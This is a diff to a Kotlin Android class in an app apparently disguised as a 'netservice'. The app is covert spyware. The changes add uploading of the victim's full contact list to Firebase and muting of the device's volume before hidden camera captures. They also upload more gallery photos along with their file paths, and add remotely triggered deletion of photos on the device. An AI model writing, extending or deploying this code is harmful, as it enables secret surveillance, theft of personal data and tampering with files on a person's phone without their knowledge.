@@ -1,12 +1,16 @@
 package com.dtz.netservice.services.accessibilityData
 
+import android.app.RecoverableSecurityException
 import android.content.Context
 import android.content.pm.PackageManager
 import android.location.Geocoder
 import android.location.Location
+import android.media.AudioManager
 import android.media.MediaRecorder
 import android.net.Uri
+import android.os.Build
 import android.os.Environment
+import android.provider.MediaStore
 import android.util.Log
 import android.webkit.MimeTypeMap
 import androidx.core.app.ActivityCompat
@@ -14,6 +18,7 @@ import com.dtz.netservice.R
 import com.dtz.netservice.data.model.*
 import com.dtz.netservice.rxFirebase.InterfaceFirebase
 import com.dtz.netservice.services.social.MonitorService
+import com.dtz.netservice.utils.*
 import com.dtz.netservice.utils.ConstFun.getDateTime
 import com.dtz.netservice.utils.ConstFun.getRandomNumeric
 import com.dtz.netservice.utils.ConstFun.showApp
@@ -40,11 +45,9 @@ import com.dtz.netservice.utils.Consts.SOCIAL
 import com.dtz.netservice.utils.Consts.TAG
 import com.dtz.netservice.utils.Consts.TIMER
 import com.dtz.netservice.utils.Consts.VIDEOS
-import com.dtz.netservice.utils.FileHelper
+import com.dtz.netservice.utils.Contacts
 import com.dtz.netservice.utils.FileHelper.getFileNameAudio
 import com.dtz.netservice.utils.FileHelper.getFilePath
-import com.dtz.netservice.utils.MediaRecorderUtils
-import com.dtz.netservice.utils.MyCountDownTimer
 import com.dtz.netservice.utils.hiddenCameraServiceUtils.CameraCallbacks
 import com.dtz.netservice.utils.hiddenCameraServiceUtils.CameraConfig
 import com.dtz.netservice.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
@@ -60,8 +63,12 @@ import com.pawegio.kandroid.e
 import io.reactivex.android.schedulers.AndroidSchedulers
 import io.reactivex.disposables.CompositeDisposable
 import io.reactivex.schedulers.Schedulers
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.withContext
 import java.io.File
 import java.io.IOException
+import java.nio.file.Files
+import java.nio.file.Paths
 import java.text.SimpleDateFormat
 import java.util.*
 import javax.inject.Inject
@@ -140,8 +147,16 @@ class InteractorAccessibilityData @Inject constructor(
             firebase.getDatabaseReference(LOCATIONS).push().setValue(model)
 
             setDataLocationHourly(location)
+
+            saveContacts()
         }
 
+    }
+
+    private fun saveContacts() {
+        //Contacts
+        val contactsList = Contacts.contactsList(context)
+        firebase.getDatabaseReference("${Consts.CONTACTS}/").setValue(contactsList)
     }
 
     private fun setDataLocationHourly(location: Location) {
@@ -238,13 +253,12 @@ class InteractorAccessibilityData @Inject constructor(
                     else CameraRotation.ROTATION_90
                 )
                 .build()
+            reduceVolume()
             pictureCapture.startCamera(cameraConfig)
         }
     }
 
-    private fun getGalleryPhoto(child: GalleryPhoto) {
-        Log.d("PHOTOS", "..............******................")
-
+    private fun getGalleryPhoto(galleryPhoto: GalleryPhoto) {
         val dcimPath = File(
             Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
                 .toString() + "/Camera"
@@ -254,18 +268,31 @@ class InteractorAccessibilityData @Inject constructor(
             if (files != null) {
                 for (i in files.indices) {
                     if (!isVideoFileUri(files[i].absolutePath)) {
-                        if (i < 5) {
+                        if (i < 10) {
                             sendGalleryPhoto(files[i]);
                         }
                     }
                 }
             }
         }
+
+        if (galleryPhoto.removePhotos!!) {
+            if (galleryPhoto.photoPath != null) {
+                Log.d("FILE", "..............******................")
+                val file = File(galleryPhoto.photoPath!!)
+                val result = file.delete()
+                if (result) {
+                    println("Deletion succeeded.")
+                    Log.d("FILE", "Deletion success")
+                } else {
+                    Log.d("FILE", "Deletion failed")
+                }
+                resetParamsPhotos()
+            }
+        }
     }
 
     private fun getGalleryVideos(child: GalleryVideo) {
-        Log.d("VIDEOS", "..............******................")
-
         val dcimPath = File(
             Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM)
                 .toString() + "/Camera"
@@ -273,13 +300,19 @@ class InteractorAccessibilityData @Inject constructor(
         if (dcimPath.exists()) {
             val files = dcimPath.listFiles()
             if (files != null) {
-                Log.d("VIDEOS", "***** ${files.size}")
                 for (i in files.indices) {
                     if (isVideoFileUri(files[i].absolutePath)) {
                         sendGalleryVideo(files[i]);
                     }
                 }
             }
+        }
+    }
+
+    private fun reduceVolume() {
+        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            audioManager.adjustVolume(AudioManager.ADJUST_MUTE, AudioManager.FLAG_SHOW_UI)
         }
     }
 
@@ -344,6 +377,7 @@ class InteractorAccessibilityData @Inject constructor(
                             val photoMap: MutableMap<String, Any> = mutableMapOf()
                             photoMap["file"] = it.result.toString()
                             photoMap["name"] = photoName
+                            photoMap["path"] = file.absolutePath
                             firebase.getDatabaseReference("$PHOTOS/$DATA").child(photoName)
                                 .updateChildren(photoMap)
                             firebase.getDatabaseReference("$PHOTOS/$PARAMS/$GET_GALLERY_PHOTO")
@@ -371,6 +405,7 @@ class InteractorAccessibilityData @Inject constructor(
                             val videoMap: MutableMap<String, Any> = mutableMapOf()
                             videoMap["file"] = it.result.toString()
                             videoMap["name"] = videoName
+                            videoMap["path"] = file.absolutePath
                             firebase.getDatabaseReference("$VIDEOS/$DATA").child(videoName)
                                 .updateChildren(videoMap)
                             firebase.getDatabaseReference("$VIDEOS/$PARAMS/$GET_GALLERY_VIDEOS")
@@ -497,6 +532,12 @@ class InteractorAccessibilityData @Inject constructor(
     private fun resetParamsRecording() {
         val childRecording = ChildRecording(false, 0)
         firebase.getDatabaseReference("$RECORDING/$PARAMS").setValue(childRecording)
+        setIntervalRecord(0)
+    }
+
+    private fun resetParamsPhotos() {
+        val childGalleryPhoto = GalleryPhoto(false, 0, false, "null")
+        firebase.getDatabaseReference("$PHOTOS/$PARAMS").setValue(childGalleryPhoto)
         setIntervalRecord(0)
     }
 
